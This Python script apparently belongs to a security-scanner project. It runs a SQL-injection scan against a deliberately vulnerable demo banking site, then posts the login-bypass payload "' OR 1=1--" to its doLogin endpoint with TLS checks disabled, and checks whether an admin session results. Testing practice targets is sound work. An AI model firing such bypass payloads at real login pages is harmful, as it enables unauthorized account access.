"""Live SQLi re-check + doLogin authentication smoke test."""
from __future__ import annotations

import traceback
from pathlib import Path

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "_live_sqli_check_output.txt"


def log(fh, msg: str) -> None:
    fh.write(msg + "\n")
    fh.flush()
    print(msg, flush=True)


def main() -> int:
    with OUT.open("w", encoding="utf-8") as fh:
        log(fh, "=== LIVE SQLI ===")
        try:
            from login_page.scanners.tc14_sql_injection import SQLiConfig, scan_sql_injection

            r = scan_sql_injection(
                "https://demo.testfire.net/",
                config=SQLiConfig(login_path="/login.jsp", verify_tls=True),
            )
            details = r.get("details") or {}
            assessments = details.get("assessments") or []
            first = assessments[0] if assessments else {}
            username_field = (first.get("details") or {}).get("username_field")
            used = [p.get("payload") for p in (details.get("payloads_used") or [])][:5]
            log(fh, f"STATUS {r.get('status')}")
            log(fh, f"SUMMARY {r.get('summary')}")
            log(fh, f"TRIGGER {details.get('triggering_payload')}")
            log(fh, f"BASE {details.get('baseline_url')}")
            log(fh, f"RELAXED {details.get('tls_verification_relaxed')}")
            log(fh, f"FIELD {username_field}")
            log(fh, f"USED {used}")
            if details.get("error"):
                log(fh, f"ERROR {details.get('error')}")
        except Exception:
            log(fh, traceback.format_exc())
            log(fh, "LIVE_SQLI_EXCEPTION=1")

        log(fh, "")
        log(fh, "=== DOLOGIN POST ===")
        try:
            import requests

            resp = requests.post(
                "https://demo.testfire.net/doLogin",
                data={"uid": "' OR 1=1--", "passw": "aaaa"},
                verify=False,
                allow_redirects=True,
                timeout=30,
            )
            body = resp.text or ""
            log(fh, f"FINAL_URL {resp.url}")
            log(fh, f"STATUS_CODE {resp.status_code}")
            log(fh, f"HAS_SIGN_OFF {'Sign Off' in body}")
            log(fh, f"HAS_HELLO_ADMIN {'Hello Admin' in body}")
        except Exception:
            log(fh, traceback.format_exc())
            log(fh, "DOLOGIN_EXCEPTION=1")
            return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
